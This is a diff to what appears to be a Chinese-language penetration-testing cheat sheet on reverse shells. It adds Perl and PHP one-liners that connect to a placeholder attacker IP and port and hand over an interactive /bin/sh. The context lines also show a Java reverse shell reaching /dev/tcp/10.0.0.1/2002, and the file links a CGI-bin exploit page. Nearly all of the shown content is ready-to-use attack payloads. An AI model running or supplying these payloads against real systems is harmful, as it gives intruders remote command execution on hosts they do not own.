@@ -42,6 +42,13 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
++ Perl 
+`perl -e 'use Socket;$i="[AttackerIP]";$p=[AttackerPort];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+
++ PHP 
+`php -r '$sock=fsockopen("[attackerIP]",[attackerPort]);exec("/bin/sh -i <&3 >&3 2>&3");'`
+
+
 ### 攻擊技巧
 + [CGI-bin exploit](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
 
